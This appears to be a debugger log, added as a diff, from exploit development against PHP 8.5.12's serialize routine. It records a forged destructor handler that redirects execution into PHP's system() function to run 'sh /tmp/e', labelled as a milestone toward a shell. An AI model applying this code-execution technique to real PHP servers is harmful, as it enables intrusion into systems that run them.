@@ -1,0 +1,51 @@
+warning: File "/tmp/php8512_build/plain2/sapi/cli/php" auto-loading has been declined by your `auto-load safe-path' set to "$debugdir:$datadir/auto-load".
+To enable execution of this file add
+	add-auto-load-safe-path /tmp/php8512_build/plain2/sapi/cli/php
+line to your configuration file "/root/.config/gdb/gdbinit".
+To completely disable this security protection add
+	set auto-load safe-path /
+line to your configuration file "/root/.config/gdb/gdbinit".
+For more information about this security protection see the
+"Auto-loading safe path" section in the GDB manual.  E.g., run from the shell:
+	info "(gdb)Auto-loading safe path"
+Breakpoint 1 at 0x588600: php_var_serialize_destroy. (2 locations)
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+
+Breakpoint 1, php_var_serialize_destroy (d=0x7ffff5403040) at /tmp/php8512_build/php-8.5.12/ext/standard/var.c:1426
+1426	PHPAPI void php_var_serialize_destroy(php_serialize_data_t d) {
+== OUTER destroy entry: old-arData block = 0x7ffff5482000 (must equal argv BASE)
+Breakpoint 2 at 0x555555923c60: file /tmp/php8512_build/php-8.5.12/ext/standard/exec.c, line 250.
+
+Breakpoint 2, zif_system (execute_data=0x7ffff5482018, return_value=0x555555fe73c0 <bin_data_size>) at /tmp/php8512_build/php-8.5.12/ext/standard/exec.c:250
+250	{
+== M3: zif_system REACHED via forged dtor_obj dispatch
+   rdi (fake zend_execute_data / fake zend_object) = 0x7ffff5482018  (expect 0x7ffff5482018)
+   rsi (return_value slot)                         = 0x555555fe73c0
+#0  zif_system (execute_data=0x7ffff5482018, return_value=0x555555fe73c0 <bin_data_size>) at /tmp/php8512_build/php-8.5.12/ext/standard/exec.c:250
+#1  0x0000555555b0b553 in zend_objects_store_del (object=0x7ffff5482018) at /tmp/php8512_build/php-8.5.12/Zend/zend_objects_API.c:181
+#2  0x0000555555ad607d in zend_hash_destroy (ht=ht@entry=0x7ffff5403040) at /tmp/php8512_build/php-8.5.12/Zend/zend_hash.c:1985
+#3  0x0000555555988640 in php_var_serialize_destroy (d=0x7ffff5403040) at /tmp/php8512_build/php-8.5.12/ext/standard/var.c:1429
+#4  0x00005555559886ca in zif_serialize (execute_data=0x7ffff5414820, return_value=0x7ffff5414720) at /tmp/php8512_build/php-8.5.12/ext/standard/var.c:1450
+#5  0x0000555555ac1e8e in ZEND_DO_ICALL_SPEC_RETVAL_USED_HANDLER () at /tmp/php8512_build/php-8.5.12/Zend/zend_vm_execute.h:1426
+#6  execute_ex (ex=0x7ffff5482018) at /tmp/php8512_build/php-8.5.12/Zend/zend_vm_execute.h:51019
+#7  0x0000555555ac66a0 in zend_execute (op_array=op_array@entry=0x7ffff549d000, return_value=return_value@entry=0x0) at /tmp/php8512_build/php-8.5.12/Zend/zend_vm_execute.h:122038
+#8  0x0000555555b294da in zend_execute_script (type=type@entry=8, retval=retval@entry=0x0, file_handle=file_handle@entry=0x7fffffffca80) at /tmp/php8512_build/php-8.5.12/Zend/zend.c:1990
+#9  0x00005555559b9d68 in php_execute_script_ex (primary_file=<optimized out>, retval=<optimized out>) at /tmp/php8512_build/php-8.5.12/main/main.c:2688
+#10 0x0000555555b2b397 in do_cli (argc=5, argv=0x5555564f6020) at /tmp/php8512_build/php-8.5.12/sapi/cli/php_cli.c:960
+#11 0x00005555556498a5 in main (argc=5, argv=0x5555564f6020) at /tmp/php8512_build/php-8.5.12/sapi/cli/php_cli.c:1383
+   parsed arg1 command: 0x7ffff5482090:	"sh /tmp/e"
+   fake handlers->dtor_obj @ rdi+24 -> +16:
+0x7ffff54820c0:	0x0000555555923c60
+[Detaching after vfork from child process 1361205]
+
+Program received signal SIGSEGV, Segmentation fault.
+0x00005555559238af in php_exec (type=1, cmd=<optimized out>, array=0x0, return_value=0x555555fe73c0 <bin_data_size>) at /tmp/php8512_build/php-8.5.12/ext/standard/exec.c:171
+171				RETVAL_EMPTY_STRING();
+== zif_system returned
+
+Program terminated with signal SIGSEGV, Segmentation fault.
+The program no longer exists.
+== final stop
+/mnt/c/Users/andre/Downloads/php2shell-claude/sr2_m3.gdb:31: Error in sourced command file:
+No stack.
